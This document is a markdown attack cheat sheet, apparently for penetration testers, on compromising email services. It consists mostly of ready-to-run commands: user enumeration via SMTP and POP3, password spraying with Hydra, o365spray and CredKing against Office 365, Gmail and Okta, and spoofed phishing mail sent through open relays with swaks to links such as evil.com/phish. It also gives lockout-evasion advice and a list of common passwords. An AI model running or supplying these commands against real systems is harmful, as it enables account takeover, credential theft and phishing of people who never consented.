# Email Services Attack Quick Reference

## Email Protocols & Ports

| Protocol | Port | Encryption | Purpose |
|----------|------|------------|---------|
| **SMTP** | 25 | None | Send mail (unencrypted) |
| **SMTP** | 465 | SSL/TLS | Send mail (encrypted) |
| **SMTP** | 587 | STARTTLS | Send mail (encrypted) |
| **POP3** | 110 | None | Receive mail (unencrypted) |
| **POP3** | 995 | SSL/TLS | Receive mail (encrypted) |
| **IMAP** | 143 | None | Receive mail (unencrypted) |
| **IMAP** | 993 | SSL/TLS | Receive mail (encrypted) |

## Enumeration

### Identify Mail Server (MX Records)

```bash
# Using host
host -t MX domain.com

# Using dig
dig mx domain.com

# Filter output
dig mx domain.com | grep "MX" | grep -v ";"

# Get A record for mail server
host -t A mail1.domain.com
```

**Cloud Providers Indicators**:
- `aspmx.l.google.com` → G-Suite/Google Workspace
- `*.mail.protection.outlook.com` → Microsoft 365
- `*.zoho.com` → Zoho Mail

### Nmap Enumeration

```bash
# Scan all mail ports
nmap -Pn -sV -sC -p25,110,143,465,587,993,995 TARGET

# SMTP specific
nmap -p25 --script smtp-commands,smtp-open-relay TARGET

# Check for open relay
nmap -p25 --script smtp-open-relay TARGET
```

## Username Enumeration

### SMTP Commands (Manual)

#### VRFY (Verify user exists)
```bash
telnet TARGET 25

VRFY root
# 252 2.0.0 root = User exists
# 550 5.1.1 User unknown = Doesn't exist

VRFY john
VRFY admin
```

#### EXPN (Expand mailing list)
```bash
telnet TARGET 25

EXPN john
# 250 2.1.0 john@domain.com

EXPN support-team
# Lists all members of group
```

#### RCPT TO (Recipient check)
```bash
telnet TARGET 25

MAIL FROM:test@test.com
250 OK

RCPT TO:john
# 250 2.1.5 Recipient ok = User exists
# 550 5.1.1 User unknown = Doesn't exist

RCPT TO:admin
```

### POP3 Enumeration

```bash
telnet TARGET 110

USER john
# +OK = User exists
# -ERR = User doesn't exist

USER admin
```

### smtp-user-enum (Automated)

```bash
# VRFY mode
smtp-user-enum -M VRFY -U users.txt -t TARGET

# RCPT mode (most reliable)
smtp-user-enum -M RCPT -U users.txt -D domain.com -t TARGET

# EXPN mode
smtp-user-enum -M EXPN -U users.txt -t TARGET
```

**Modes**:
- `-M VRFY` - Use VRFY command
- `-M EXPN` - Use EXPN command
- `-M RCPT` - Use RCPT TO command (best)

## Cloud Service Enumeration

### Office 365 (O365spray)

#### Install
```bash
git clone https://github.com/0xZDH/o365spray.git
cd o365spray
pip3 install -r requirements.txt
```

#### Validate domain uses O365
```bash
python3 o365spray.py --validate --domain domain.com
```

#### Enumerate users
```bash
python3 o365spray.py --enum -U users.txt --domain domain.com
```

### MailSniper (Office 365 - PowerShell)

```powershell
# Import module
Import-Module MailSniper.ps1

# Enumerate users
Invoke-UsernameHarvestOWA -ExchHostname domain.com -UserList users.txt -Threads 10
```

## Password Attacks

### Hydra

```bash
# SMTP
hydra -L users.txt -p 'Password123' smtp://TARGET

# POP3
hydra -L users.txt -p 'Password123' pop3://TARGET

# IMAP
hydra -L users.txt -p 'Password123' imap://TARGET

# Password spray (recommended)
hydra -L users.txt -p 'Company01!' -f TARGET pop3

# With port
hydra -L users.txt -P passwords.txt smtp://TARGET:587
```

### O365 Password Spray

```bash
# Single password spray
python3 o365spray.py --spray -U users.txt -p 'Password123!' --count 1 --lockout 1 --domain domain.com

# Multiple passwords
python3 o365spray.py --spray -U users.txt -P passwords.txt --count 2 --lockout 5 --domain domain.com
```

**Options**:
- `--count` - Passwords per spray cycle
- `--lockout` - Minutes to wait between sprays
- `--domain` - Target domain

### CredKing (Gmail/Okta)

```bash
# Gmail
python3 credking.py --plugin gmail --userlist users.txt --passwordlist passwords.txt

# Okta
python3 credking.py --plugin okta --userlist users.txt --password 'Password123'
```

## Open Relay Attack

### Check for Open Relay

```bash
# With nmap
nmap -p25 --script smtp-open-relay TARGET

# Manual test
telnet TARGET 25
MAIL FROM:<attacker@external.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Test message
.
QUIT
```

### Exploit Open Relay (Phishing)

#### Using swaks
```bash
# Send spoofed email
swaks --from notifications@company.com \
      --to employees@company.com \
      --header 'Subject: Important Notice' \
      --body 'Click here: http://phishing-link.com' \
      --server TARGET

# With attachment
swaks --from hr@company.com \
      --to victim@company.com \
      --header 'Subject: Invoice' \
      --body 'See attached invoice' \
      --attach invoice.pdf \
      --server TARGET
```

#### Using sendemail
```bash
sendemail -f attacker@domain.com \
          -t victim@target.com \
          -u "Subject Line" \
          -m "Email body" \
          -s TARGET:25
```

## Quick Attack Workflows

### Workflow 1: SMTP User Enumeration
```bash
# 1. Find mail server
host -t MX domain.com

# 2. Get mail server IP
host -t A mail1.domain.com

# 3. Enumerate users
smtp-user-enum -M RCPT -U users.txt -D domain.com -t MAIL_IP

# 4. Password spray
hydra -L found_users.txt -p 'Password123' smtp://MAIL_IP
```

### Workflow 2: Office 365 Attack
```bash
# 1. Validate O365
python3 o365spray.py --validate --domain target.com

# 2. Enumerate users
python3 o365spray.py --enum -U users.txt --domain target.com

# 3. Password spray
python3 o365spray.py --spray -U valid_users.txt -p 'Summer2024!' --count 1 --lockout 5 --domain target.com

# 4. Access mailbox (if creds found)
```

### Workflow 3: Open Relay Phishing
```bash
# 1. Check for open relay
nmap -p25 --script smtp-open-relay TARGET

# 2. Craft phishing email
swaks --from ceo@company.com \
      --to employees@company.com \
      --header 'Subject: Urgent Action Required' \
      --body 'Update your password: http://evil.com/phish' \
      --server TARGET

# 3. Monitor phishing site for creds
```

## Connect to Mail Services

### SMTP
```bash
# Unencrypted
telnet TARGET 25

# With STARTTLS
openssl s_client -connect TARGET:587 -starttls smtp
```

### POP3
```bash
# Unencrypted
telnet TARGET 110

# Encrypted
openssl s_client -connect TARGET:995

# Commands:
USER username
PASS password
LIST
RETR 1
QUIT
```

### IMAP
```bash
# Unencrypted
telnet TARGET 143

# Encrypted
openssl s_client -connect TARGET:993

# Commands:
a LOGIN username password
b LIST "" "*"
c SELECT INBOX
d FETCH 1 BODY[]
e LOGOUT
```

## Common User Lists

```bash
# Create username list
echo -e "admin\nadministrator\nroot\nuser\ntest\nguest" > users.txt

# Common corporate usernames
# firstname.lastname@domain.com
# firstnamelastname@domain.com
# f.lastname@domain.com
# firstname@domain.com
```

## Tools Quick Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **host/dig** | MX record lookup | `host -t MX domain.com` |
| **smtp-user-enum** | User enumeration | `smtp-user-enum -M RCPT -U users.txt -t TARGET` |
| **O365spray** | O365 enum/spray | `python3 o365spray.py --spray -U users.txt -p pass` |
| **Hydra** | Password attack | `hydra -L users.txt -p pass smtp://TARGET` |
| **swaks** | Send email | `swaks --from x --to y --server TARGET` |
| **nmap** | Open relay check | `nmap -p25 --script smtp-open-relay TARGET` |

## Detection Evasion

### Password Spraying
```bash
# Low and slow
python3 o365spray.py --spray -U users.txt -p 'Pass' --count 1 --lockout 30 --domain domain.com

# Options:
# --count 1   = One password at a time
# --lockout 30 = 30 min wait between attempts
```

### Rate Limiting
- Use `--rate 1` to slow down
- Wait between spray cycles
- One password across many users (not many passwords per user)

## Common Passwords for Email

```
Password123
Welcome123
Company2024
Summer2024
Fall2024
Passw0rd!
```

## Key Notes

- **VRFY/EXPN** - Often disabled on modern servers
- **RCPT TO** - Most reliable enumeration method
- **Open Relay** - Rare but critical finding
- **Cloud services** - Block Hydra, use specialized tools
- **Password spray** - Avoid lockouts (use --lockout delays)
- **MX records** - Identify if custom or cloud hosted
